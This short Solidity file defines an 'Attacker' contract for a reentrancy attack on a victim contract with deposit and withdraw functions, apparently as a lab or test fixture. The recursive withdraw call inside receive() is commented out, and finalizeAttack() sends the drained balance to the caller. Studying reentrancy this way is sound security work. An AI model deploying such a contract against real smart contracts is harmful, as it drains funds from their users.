// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;

import "hardhat/console.sol";

interface IVictim {
    function deposit() external payable;

    function withdraw(uint _amount) external;
}

contract Attacker {
    IVictim public victim;
    uint public amount;

    constructor(address _victimAddress, uint _amount) {
        victim = IVictim(_victimAddress);
        amount = _amount;
    }

    function attack() external payable {
        victim.deposit{value: amount}();
        victim.withdraw(amount);
    }

    function finalizeAttack() external {
        payable(msg.sender).transfer(address(this).balance);
    }

    receive() external payable {
        // console.log("victim balance: %s", address(victim).balance);
        // if (address(victim).balance >= amount) {
        //     victim.withdraw(amount);
        // }
    }
}
